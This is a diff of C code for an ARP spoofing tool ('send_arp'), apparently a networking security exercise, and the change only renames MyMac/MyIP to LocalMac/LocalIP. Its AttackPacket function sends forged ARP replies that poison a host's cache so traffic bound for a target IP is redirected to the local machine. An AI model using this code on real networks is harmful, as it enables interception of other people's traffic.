@@ -1,20 +1,20 @@
 #include "send_arp.h"
 
 /* Ref: https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program */
-int GetMyMac(struct ether_addr* MyMac, char* dev){
+int GetLocalMac(struct ether_addr* LocalMac, char* dev){
     struct ifreq s;
     int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
 
     strcpy(s.ifr_name, dev);
     if (ioctl(fd, SIOCGIFHWADDR, &s) == 0) {
-        memcpy(MyMac, s.ifr_addr.sa_data, ETHER_ADDR_LEN);
+        memcpy(LocalMac, s.ifr_addr.sa_data, ETHER_ADDR_LEN);
         return 1;
     }
     return 0;
 }
 
 /* Ref: https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux */
-int GetMyIP(struct in_addr* MyIP, char* dev){
+int GetLocalIP(struct in_addr* LocalIP, char* dev){
     int fd;
     struct ifreq ifr;
     fd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -26,12 +26,12 @@ int GetMyIP(struct in_addr* MyIP, char* dev){
     close(fd);
 
     /* display result */
-    memcpy(MyIP, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, IPVERSION);
+    memcpy(LocalIP, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, IPVERSION);
 
     return 1;
 }
 
-int GetSenderMac(pcap_t* handle, struct ether_addr MyMac, struct in_addr MyIP, struct in_addr SenderIP, struct ether_addr* SMac){
+int GetSenderMac(pcap_t* handle, struct ether_addr LocalMac, struct in_addr LocalIP, struct in_addr SenderIP, struct ether_addr* SMac){
     struct ether_addr BroadcastMac;
     struct ether_addr UnknownMac;
     char *Genpacket = (char *)malloc(ETHER_MAX_LEN);
@@ -47,7 +47,7 @@ int GetSenderMac(pcap_t* handle, struct ether_addr MyMac, struct in_addr MyIP, s
 
     memcpy(&BroadcastMac, "\xFF\xFF\xFF\xFF\xFF\xFF",ETHER_ADDR_LEN);
     memcpy(&UnknownMac, "\x00\x00\x00\x00\x00\x00",ETHER_ADDR_LEN);
-    if(GenArpPacket(BroadcastMac, MyMac, ARPOP_REQUEST, MyIP, MyMac, SenderIP, UnknownMac, &Genpacket, &size) != 1){
+    if(GenArpPacket(BroadcastMac, LocalMac, ARPOP_REQUEST, LocalIP, LocalMac, SenderIP, UnknownMac, &Genpacket, &size) != 1){
         return 0;
     }
     if(pcap_sendpacket(handle, (const u_char *)Genpacket, size)){
@@ -62,7 +62,7 @@ int GetSenderMac(pcap_t* handle, struct ether_addr MyMac, struct in_addr MyIP, s
         peth_hdr = (struct ether_header*) packet;
 
         if(peth_hdr->ether_type == htons(ETHERTYPE_ARP) &&
-                !memcmp(peth_hdr->ether_dhost, &MyMac,ETHER_ADDR_LEN)){
+                !memcmp(peth_hdr->ether_dhost, &LocalMac,ETHER_ADDR_LEN)){
 
             parp_hdr = (struct arphdr*) (packet + sizeof(struct ether_header));
 
@@ -74,8 +74,8 @@ int GetSenderMac(pcap_t* handle, struct ether_addr MyMac, struct in_addr MyIP, s
 
                 parp_addr = (struct arp_addr*)(packet + sizeof(struct ether_header) + sizeof(struct arphdr));
                 if(!memcmp(&parp_addr->SenderIP, &SenderIP, IPVERSION) &&
-                        !memcmp(&parp_addr->TargetMac, &MyMac, ETHER_ADDR_LEN) &&
-                        !memcmp(&parp_addr->TargetIP, &MyIP,IPVERSION)){
+                        !memcmp(&parp_addr->TargetMac, &LocalMac, ETHER_ADDR_LEN) &&
+                        !memcmp(&parp_addr->TargetIP, &LocalIP,IPVERSION)){
                     memcpy(SMac, &parp_addr->SenderMac, ETHER_ADDR_LEN);
                     break;
                 }
@@ -117,10 +117,10 @@ int GenArpPacket(struct ether_addr DMac, struct ether_addr SMac, uint16_t OpCode
     return 1;
 }
 
-int AttackPacket(pcap_t* handle, struct ether_addr SenderMac, struct ether_addr MyMac, struct in_addr TargetIP, struct in_addr SenderIP){
+int AttackPacket(pcap_t* handle, struct ether_addr SenderMac, struct ether_addr LocalMac, struct in_addr TargetIP, struct in_addr SenderIP){
     char *Genpacket = (char *)malloc(ETHER_MAX_LEN);
     uint32_t size;
-    GenArpPacket(SenderMac,MyMac,ARPOP_REPLY,TargetIP,MyMac,SenderIP,SenderMac,&Genpacket,&size);
+    GenArpPacket(SenderMac,LocalMac,ARPOP_REPLY,TargetIP,LocalMac,SenderIP,SenderMac,&Genpacket,&size);
     if(pcap_sendpacket(handle,(const u_char *)Genpacket,size)){
         return 0;
     }
